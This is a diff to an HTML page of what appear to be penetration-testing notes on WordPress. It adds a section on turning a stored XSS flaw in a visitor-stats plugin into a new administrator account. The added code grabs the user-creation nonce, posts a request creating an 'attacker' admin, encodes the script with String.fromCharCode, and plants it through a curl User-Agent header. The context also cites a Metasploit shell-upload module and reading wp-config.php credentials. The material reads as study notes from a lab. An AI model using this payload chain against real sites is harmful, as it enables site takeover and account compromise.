@@ -82,10 +82,6 @@ http://domain.com/wp-content/uploads #Uploads directory</code></pre>
                         <pre><code class="language-bash">http://blog.inlanefreight.local/wp-content/plugins/plugin-name/</code></pre> 
                     </ul>
                 </ul>
-
-                
-                
-               
             </ul>
 
             <h2>Exploitation</h2>
@@ -106,6 +102,50 @@ http://domain.com/wp-content/uploads #Uploads directory</code></pre>
                     <pre><code class="language-bash">exploit/unix/webapp/wp_admin_shell_upload  </code></pre>
                     <p>Just in case you have a reverse shell, look for database credentials in the <b>/var/www/html/wp-config.php</b></p>
                 </ul>
+                <h3>Privilege escalation through XSS. Admin user creation</h3>
+                <ul>
+                    <p>All this process is based in the following post <a class="notion-link" href="https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/">shift8</a></p>
+                    <p>In this section we will describe how to create an administrator user abusing an XSS vulnerability</p>
+                    <p>First identify a parameter in the request which could be affected by an XSS vulnerability. In this example there is installed a plugin called Visitors which stores some stats of the users which visit the wordpress website.</p>
+                    <p>In that case we identifyed that the user-agent parameter is stored in the plugin and that there is no sanitization which allow us to perform XSS attack</p>
+                    <p>To perform this attack we first need to find a way of dealing with <a class="notion-link" href="https://developer.wordpress.org/reference/functions/wp_nonce_field/">nonce</a> This nonce thing is basically a token that wordpress generates in every webrequest and which prevents from CSRF attacks. </p>
+                    <p>Since in our case the request will be performed from inside the wordpress (admin will look at the plugin from the admin panel and trigger the exploit) we don't have to worry about nonce.</p>
+                    <p>This function performs a new HTTP request towards the <b>/wp-admin/user-new.php</b> URL and saves the nonce value found in the HTTP response based on the regular expression.</p>
+                    <pre><code class="language-javascript">var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+=var nonceRegex  /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];</code></pre>
+                     <p>Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.</p>   
+                    <pre><code class="language-bash">var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);</code></pre>  
+                     <p>To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify <a class="notion-link" href="https://jscompress.com/">(jscompress.com)</a> it, then encode it.</p>   
+                     <p>Situate the two previous codes and click in compress</p>   
+                     <p>Then we need to encode the resulting code to avoid any possible error in the request. We will run the following code inserting the result of the compress code</p>   
+                     <pre><code class="language-bash">function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)</code></pre>   
+                   <p>The resulting may be something like this</p>   
+                   <pre><code class="language-bash">118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77...</code></pre>
+                   <p>Now send the code to the server</p>
+                   <pre><code class="language-bash">curl -i http://offsecwp --user-agent "&lt;script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,...))&lt;/script&gt;" </code></pre> 
+                
             </ul>
         </div>
     </div>
